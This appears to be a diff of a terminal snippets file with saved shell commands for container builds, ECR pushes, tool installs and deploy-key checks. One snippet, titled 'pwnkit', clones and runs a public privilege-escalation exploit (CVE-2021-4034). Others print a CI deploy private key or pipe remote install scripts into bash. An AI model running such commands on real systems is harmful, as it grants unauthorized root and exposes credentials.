@@ -6369,15 +6369,16 @@
 			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
-			<string>F63C6493-2E09-4FA3-91B8-0549DFD1B588</string>
+			<string>73AACC10-3429-43CC-85E6-7A06A31DF4D8</string>
 			<key>title</key>
-			<string>check deploy keys</string>
+			<string>build and upload new focal container</string>
 			<key>value</key>
-			<string>sudo su deploy -l
-cat ~/.ssh/authorized_keys
-cat /opt/glitch/ci/secrets/id-deploy
-
-</string>
+			<string>sudo docker system prune -a --volumes -y
+sudo docker build -t localhost:1234/app-image-focal:$(git rev-parse --short HEAD) .
+wait $!
+sudo docker tag localhost:1234/app-image-focal:$(git rev-parse --short HEAD) 993886623663.dkr.ecr.us-east-1.amazonaws.com/app-image-focal:$(git rev-parse --short HEAD)
+aws ecr get-login-password --region us-east-1 | sudo docker login --username AWS --password-stdin 993886623663.dkr.ecr.us-east-1.amazonaws.com
+sudo docker push 993886623663.dkr.ecr.us-east-1.amazonaws.com/app-image-focal:$(git rev-parse --short HEAD)</string>
 			<key>version</key>
 			<integer>2</integer>
 		</dict>
@@ -6385,12 +6386,24 @@ cat /opt/glitch/ci/secrets/id-deploy
 			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
-			<string>3FCA9DEF-CB54-4150-9FE2-0A10A1341E04</string>
+			<string>23C322A0-3929-4FBB-AEE7-2F04C5146CBB</string>
 			<key>title</key>
-			<string>check for only fastly keys</string>
+			<string>remote setup</string>
 			<key>value</key>
-			<string>diff &lt;(sudo ssh-keygen -l -Emd5 -f /home/deploy/.ssh/authorized_keys) &lt;(ssh-keygen -l -Emd5 -f /opt/glitch/ci/secrets/id-deploy) &amp;&amp; echo $?
-</string>
+			<string>curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash
+bash &lt;(curl https://raw.githubusercontent.com/ellie/atuin/main/install.sh)</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>0</integer>
+			<key>guid</key>
+			<string>EB64E85E-9852-49C7-842D-B6289C739A61</string>
+			<key>title</key>
+			<string>top containers by CPU</string>
+			<key>value</key>
+			<string>docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}" | sort -k 2hr</string>
 			<key>version</key>
 			<integer>2</integer>
 		</dict>
@@ -6548,19 +6561,6 @@ done</string>
 			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
-			<string>23C322A0-3929-4FBB-AEE7-2F04C5146CBB</string>
-			<key>title</key>
-			<string>remote setup</string>
-			<key>value</key>
-			<string>curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash
-bash &lt;(curl https://raw.githubusercontent.com/ellie/atuin/main/install.sh)</string>
-			<key>version</key>
-			<integer>2</integer>
-		</dict>
-		<dict>
-			<key>escaping</key>
-			<integer>2</integer>
-			<key>guid</key>
 			<string>709C58AB-AACD-4C3A-8AAA-677570D946D1</string>
 			<key>title</key>
 			<string>su deploy</string>
@@ -6595,18 +6595,6 @@ bash &lt;(curl https://raw.githubusercontent.com/ellie/atuin/main/install.sh)</s
 		</dict>
 		<dict>
 			<key>escaping</key>
-			<integer>0</integer>
-			<key>guid</key>
-			<string>EB64E85E-9852-49C7-842D-B6289C739A61</string>
-			<key>title</key>
-			<string>top containers by CPU</string>
-			<key>value</key>
-			<string>docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}" | sort -k 2hr</string>
-			<key>version</key>
-			<integer>2</integer>
-		</dict>
-		<dict>
-			<key>escaping</key>
 			<integer>2</integer>
 			<key>guid</key>
 			<string>1662174B-74ED-4700-ACFD-94F058A3BC0E</string>
@@ -6614,6 +6602,35 @@ bash &lt;(curl https://raw.githubusercontent.com/ellie/atuin/main/install.sh)</s
 			<string>pwnkit</string>
 			<key>value</key>
 			<string>git clone https://github.com/ryaagard/CVE-2021-4034.git &amp;&amp; cd CVE-2021-4034 &amp;&amp; make all &amp;&amp; ./exploit; exit
+</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>3FCA9DEF-CB54-4150-9FE2-0A10A1341E04</string>
+			<key>title</key>
+			<string>check for only fastly keys</string>
+			<key>value</key>
+			<string>diff &lt;(sudo ssh-keygen -l -Emd5 -f /home/deploy/.ssh/authorized_keys) &lt;(ssh-keygen -l -Emd5 -f /opt/glitch/ci/secrets/id-deploy) &amp;&amp; echo $?
+</string>
+			<key>version</key>
+			<integer>2</integer>
+		</dict>
+		<dict>
+			<key>escaping</key>
+			<integer>2</integer>
+			<key>guid</key>
+			<string>F63C6493-2E09-4FA3-91B8-0549DFD1B588</string>
+			<key>title</key>
+			<string>check deploy keys</string>
+			<key>value</key>
+			<string>sudo su deploy -l
+cat ~/.ssh/authorized_keys
+cat /opt/glitch/ci/secrets/id-deploy
+
 </string>
 			<key>version</key>
 			<integer>2</integer>
